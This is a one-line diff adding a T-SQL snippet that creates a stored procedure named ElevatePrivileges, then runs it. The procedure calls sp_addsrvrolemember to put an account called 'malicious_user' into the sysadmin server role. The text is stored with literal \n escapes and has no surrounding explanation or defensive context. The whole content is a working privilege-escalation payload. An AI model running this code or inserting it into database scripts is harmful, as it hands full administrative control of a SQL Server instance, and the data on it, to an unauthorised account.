@@ -1,0 +1,1 @@
+CREATE PROCEDURE dbo.ElevatePrivileges\n   AS\n   EXEC sp_addsrvrolemember 'malicious_user', 'sysadmin';\n   GO\n   EXEC dbo.ElevatePrivileges;
